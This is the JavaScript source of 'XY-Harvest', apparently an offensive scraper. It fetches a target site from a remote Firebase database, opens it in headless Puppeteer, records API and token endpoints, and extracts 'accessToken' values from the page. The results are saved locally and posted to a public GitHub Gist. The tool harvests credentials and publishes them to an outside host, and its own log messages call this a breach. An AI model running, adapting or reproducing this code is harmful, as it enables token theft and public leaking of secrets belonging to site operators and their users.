const express = require('express');
const puppeteer = require('puppeteer');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const GITHUB_TOKEN = process.env.XY_GIST_TOKEN;
const FIREBASE_URL = "https://kall-e4441-default-rtdb.asia-southeast1.firebasedatabase.app/scraper/request.json";

async function uploadToGist(domain, data) {
    if (!GITHUB_TOKEN) return console.log(" [!] GIST_TOKEN_MISSING");
    console.log(" [>] SYNCING TO GITHUB GIST...");
    try {
        const response = await axios.post('https://api.github.com/gists', {
            description: `XY-Harvest: ${domain}`,
            public: true,
            files: { [`${domain}.js`]: { content: `export const XY_DATA = ${JSON.stringify(data, null, 4)};` } }
        }, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` } });
        console.log(` [OK] GIST_CREATED: ${response.data.html_url}`);
    } catch (err) {
        console.log(` [ERR] GIST_FAILED: ${err.message}`);
    }
}

async function runScraper() {
    console.log(" [SYS] XY-OS BREACHING INITIATED...");
    try {
        const { data } = await axios.get(FIREBASE_URL);
        if (!data || !data.target) return;

        const target = data.target;
        const domain = new URL(target).hostname.replace(/\./g, '_');
        
        const browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        const page = await browser.newPage();

        const treasures = { endpoints: [], tokens: [] };
        page.on('request', req => {
            if (req.url().match(/api|v1|graphql|token/i)) treasures.endpoints.push(req.url());
        });

        await page.goto(target, { waitUntil: 'networkidle2', timeout: 60000 });
        const content = await page.content();
        const tokens = content.match(/["']accessToken["']\s*:\s*["']([^"']+)["']/g);
        if (tokens) treasures.tokens = tokens;

        const report = {
            meta: { target, time: new Date().toLocaleString(), author: "PoweredBy Kall & XyTeam" },
            data: treasures
        };

        // 1. Simpan Lokal
        const savePath = path.join(__dirname, 'hasil', 'auto', `${domain}.js`);
        fs.mkdirSync(path.dirname(savePath), { recursive: true });
        fs.writeFileSync(savePath, `export const XY_DATA = ${JSON.stringify(report, null, 4)};`);

        // 2. Sync ke Gist
        await uploadToGist(domain, report);

        await browser.close();
        process.exit(0); // Selesai
    } catch (err) {
        console.log(` [ERR] ${err.message}`);
        process.exit(1);
    }
}

app.listen(PORT, () => runScraper());
